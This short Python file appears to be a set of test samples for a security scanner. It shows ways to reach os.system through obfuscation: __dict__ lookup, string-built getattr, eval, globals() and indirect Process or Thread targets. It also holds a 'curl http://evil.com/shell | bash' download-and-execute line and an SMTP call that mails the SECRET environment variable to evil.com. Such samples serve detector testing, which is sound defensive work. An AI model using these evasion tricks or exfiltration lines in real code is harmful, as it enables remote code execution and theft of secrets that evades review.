import os
import subprocess
import requests
import threading
from multiprocessing import Process

#  Attribute Access via __dict__
os.__dict__["system"]("curl http://evil.com/shell | bash")

# String Manipulation in getattr
getattr(os, "sys_tem".replace("_", ""))("whoami")

# Indirect Execution Targets
Process(target=os.system, args=("ls",)).start()
threading.Thread(target=subprocess.call, args=(["ls"],)).start()

# Dictionary Method Bypass
globals().get("os").system("ls")

# eval() Chain with Missing Suspiciousness
f = eval("os.system")
f("ls")

#  Unlisted Exfiltration Sinks
import smtplib

server = smtplib.SMTP("evil.com")
server.sendmail("exfil@evil.com", "target@evil.com", os.getenv("SECRET"))
